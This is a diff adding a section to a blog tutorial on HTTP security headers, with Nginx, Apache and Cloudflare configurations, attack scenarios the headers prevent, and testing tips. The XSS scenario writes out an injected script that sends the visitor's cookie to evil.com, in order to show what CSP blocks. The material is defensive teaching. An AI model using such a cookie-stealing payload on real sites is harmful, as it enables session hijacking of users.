@@ -96,6 +96,70 @@ X-Frame-Options: SAMEORIGIN          # Only same origin allowed</code></pre>
 <li>Setting headers but not enforcing them server-side</li>
 </ul>
 
+<h2>Implementation: Nginx, Apache, Cloudflare</h2>
+<p>Adding security headers to a server is straightforward. Here are the three most common setups:</p>
+
+<h3>Nginx</h3>
+<pre><code>server {
+    # Add inside the server block
+    add_header X-Frame-Options "DENY" always;
+    add_header X-Content-Type-Options "nosniff" always;
+    add_header X-XSS-Protection "1; mode=block" always;
+    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
+    add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
+
+    # CSP — use a separate location or include it carefully
+    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-$nonce'" always;
+}</code></pre>
+
+<h3>Apache (.htaccess)</h3>
+<pre><code>&lt;IfModule mod_headers.c&gt;
+    Header set X-Frame-Options "DENY"
+    Header set X-Content-Type-Options "nosniff"
+    Header set X-XSS-Protection "1; mode=block"
+    Header set Referrer-Policy "strict-origin-when-cross-origin"
+    Header set Permissions-Policy "camera=(), microphone=(), geolocation=()"
+    Header set Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-RANDOM'"
+&lt;/IfModule&gt;</code></pre>
+
+<h3>Cloudflare Pages (_headers file)</h3>
+<pre><code># Apply to all pages
+/*
+  X-Frame-Options: DENY
+  X-Content-Type-Options: nosniff
+  Referrer-Policy: strict-origin-when-cross-origin
+  Permissions-Policy: camera=(), microphone=(), geolocation=()
+  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+  Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-CLOUDFLARE_NONCE'
+
+# Only apply CSP to HTML pages
+/*.html
+  Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-CLOUDFLARE_NONCE'; img-src 'self' data: https:; font-src 'self'</code></pre>
+
+<h2>Real Attack Scenarios These Headers Prevent</h2>
+
+<h3>XSS via Inline Script Injection</h3>
+<p>Without CSP, an attacker who injects <code>&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</code> into your page executes it immediately. With <code>default-src 'self'; script-src 'self'</code>, the browser blocks inline scripts. The <code>'nonce'</code> approach (generate a random nonce per page load and allow only <code>&lt;script nonce="..."&gt;</code>) is even stronger — attackers can't guess the nonce.</p>
+
+<h3>Clickjacking with iframe Embedding</h3>
+<p>Without <code>X-Frame-Options: DENY</code>, an attacker can embed your login page in an invisible iframe on their malicious site. When a user clicks the login button, they're actually clicking through to your site — but the attacker has overlaid a transparent layer capturing keystrokes. The DENY header prevents all framing, eliminating this entirely.</p>
+
+<h3>MIME-Sniffing XSS</h3>
+<p>Without <code>X-Content-Type-Options: nosniff</code>, a browser might interpret a plain text file as HTML if its content looks like HTML. An attacker uploads a file with <code>&lt;script&gt;...&lt;/script&gt;</code> as a "text file," and the browser runs it as HTML when served. The nosniff header tells the browser to respect the declared Content-Type.</p>
+
+<h2>Testing Your Implementation</h2>
+<p>After adding headers, verify them in practice:</p>
+<pre><code># Check headers from the command line
+curl -I https://toolsbase.net
+
+# Or from a browser: open DevTools → Network → click any request → Headers tab
+# Look for "Response Headers" section — security headers appear there
+
+# Online scanner (gives you a letter grade)
+# Visit https://securityheaders.com/?q=https://toolsbase.net
+# Aim for an A grade — B or below means something important is missing</code></pre>
+<p>Run your site through securityheaders.com after deployment. Most sites can reach an A grade with just these headers and no other changes. Cloudflare makes this especially easy — the Security Headers feature in the dashboard applies them automatically with zero server configuration.</p>
+
         <div style="margin-top:3rem;padding-top:2rem;border-top:2px solid #f0e6d9;">
           <a href="index.html" class="btn btn--secondary">← Back to Blog</a>
         </div>
